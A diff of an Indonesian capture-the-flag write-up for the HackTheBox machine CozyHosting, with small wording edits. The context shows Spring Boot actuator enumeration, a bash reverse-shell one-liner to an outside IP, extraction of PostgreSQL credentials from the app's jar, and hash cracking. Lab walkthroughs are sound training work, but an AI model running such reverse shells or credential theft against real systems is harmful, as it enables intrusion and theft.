@@ -82,9 +82,9 @@ Task Completed
 ### Spring Boot Actuator
 
 Disini saya menemukan Directory yang cukup unik yaitu `/actuator`
->Saya menacari informasi digoogle tentang apa itu actuator, dan saya menemukan bahwa actuator adalah bagian dari springboot framework java "Spring Boot Actuator adalah sub-proyek dari Spring Boot Framework. Ini mencakup sejumlah fitur tambahan yang membantu kami memantau dan mengelola aplikasi Spring Boot. Ini berisi titik akhir actuator (tempat di mana sumber daya berada). Kita dapat menggunakan endpoint HTTP dan JMX untuk mengelola dan memantau aplikasi Spring Boot. Jika kita ingin mendapatkan fitur siap produksi dalam suatu aplikasi, kita harus actuator aktuator Spring Boot"
+>Saya menacari informasi digoogle tentang apa itu actuator, dan menemukan bahwa actuator adalah bagian dari springboot framework java "Spring Boot Actuator adalah sub-proyek dari Spring Boot Framework. Ini mencakup sejumlah fitur tambahan yang membantu kami memantau dan mengelola aplikasi Spring Boot. Ini berisi titik akhir actuator (tempat di mana sumber daya berada). Kita dapat menggunakan endpoint HTTP dan JMX untuk mengelola dan memantau aplikasi Spring Boot. Jika kita ingin mendapatkan fitur siap produksi dalam suatu aplikasi, kita harus actuator aktuator Spring Boot"
 
-Dan saya mencari tau lebih lanjut apakah ada exploit untuk actuator ini, lalu saya mendapatkan referensi tentang kerentanan actuator di [hacktricks.xy](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
+Dan saya mencari tau lebih lanjut apakah ada exploit untuk actuator ini, lalu mendapatkan referensi tentang kerentanan actuator di [hacktricks.xy](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
 
 Disitu dijelaskan bahwa ada beberapa endpoint yang menimbulkan adanya `kerentanan`
 - /dump - displays a dump of threads (including a stack trace)
@@ -97,7 +97,7 @@ Disitu dijelaskan bahwa ada beberapa endpoint yang menimbulkan adanya `kerentana
 - /heapdump - Builds and returns a heap dump from the JVM used by our application
 > Ada beberapa endpoint yang tidak ada dari hasil output `dirsearch`
 
-Kemudian saya teliti semua endpoint yang saya dapat dari hasil `dirsearch` , pada endpoint `/actuator/env` terdapat credential yang terekspos, akan tetapi credentials tersebut tidak terbaca
+Kemudian saya teliti semua endpoint yang  di dapat dari hasil `dirsearch` , pada endpoint `/actuator/env` terdapat credential yang terekspos, akan tetapi credentials tersebut tidak terbaca
 
 ```sh
 ┌[parrot]─[21:13-09/09]─[~]
@@ -160,7 +160,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
 ```
 > ini adalah script revershell yang saya gunakan
 
-Saya mendapatkan akses shell sebagai pengguna APP
+Saya mendapatkan akses shell sebagai pengguna `app`
 
 ```sh
 ┌[parrot]─[22:15-09/09]─[~]
@@ -172,7 +172,7 @@ Saya mendapatkan akses shell sebagai pengguna APP
 (local) pwncat$                                                                                                         
 (remote) app@cozyhosting:/app$ 
 ```
-Saya menemukan file `jar` difolder `app`, lalu saya copy file tersebut ke dir `tmp`  dan saya extract. Saya menemukan credential database `postgresql` didalam file `application.properties` pada directory `/BOOT-INF/classes` 
+Saya menemukan file `jar` difolder `app`, lalu saya copy file tersebut ke dir `tmp`  dan extract. Saya menemukan credential database `postgresql` didalam file `application.properties` pada directory `/BOOT-INF/classes` 
 
 ```sh
 (remote) app@cozyhosting:/app$ ls
@@ -261,7 +261,7 @@ cozyhosting=# select * from users;
 
 cozyhosting=# 
 ```
-Lalu saya memecahkan hash tersebut menggunakan `john ripper` dan saya berhasil memecahkannya
+Lalu saya mencoba memecahkan hash tersebut menggunakan `john ripper` dan berhasil memecahkannya
 
 ```sh
 ┌[parrot]─[03:56-10/09]─[/home/k1r4/Documents/exercise/HTB/Easy/CozyHosting]
